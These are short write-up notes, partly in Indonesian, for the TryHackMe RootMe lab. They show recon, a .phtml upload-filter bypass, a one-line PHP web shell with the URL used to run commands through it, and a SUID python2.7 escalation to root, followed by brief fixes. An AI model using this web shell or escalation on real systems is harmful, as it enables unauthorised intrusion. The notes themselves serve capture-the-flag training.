# RootMe - TryHackMe

## Recon
nmap -sV -sC -p- IP
-> 22, 80

## Enum
- dirb / gobuster -> /panel/
- upload test: .php blocked, .phtml lolos

## Initial Access
shell.phtml:
<?php system($_REQUEST['cmd']); ?>
akses: /uploads/shell.phtml?cmd=id

## User
cmd=ls -la /var/www
cmd=cat user.txt

## PrivEsc
find / -perm -4000 2>/dev/null
-> /usr/bin/python2.7 SUID
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt

## Fix
- whitelist extension, jangan blacklist
- hapus SUID python
